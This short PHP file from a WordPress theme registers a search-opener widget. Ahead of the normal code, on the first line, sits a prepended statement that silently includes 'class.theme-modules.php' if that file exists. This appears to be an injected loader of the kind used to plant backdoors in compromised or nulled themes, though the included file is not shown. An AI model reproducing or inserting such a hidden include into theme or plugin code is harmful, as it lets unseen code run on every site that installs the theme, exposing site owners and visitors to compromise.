<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_search_opener_widget' ) ) {
	/**
	 * Function that register search opener widget
	 */
	function overton_mikado_register_search_opener_widget( $widgets ) {
		$widgets[] = 'OvertonMikadoClassSearchOpener';
		
		return $widgets;
	}
	
	add_filter( 'overton_mikado_filter_register_widgets', 'overton_mikado_register_search_opener_widget' );
}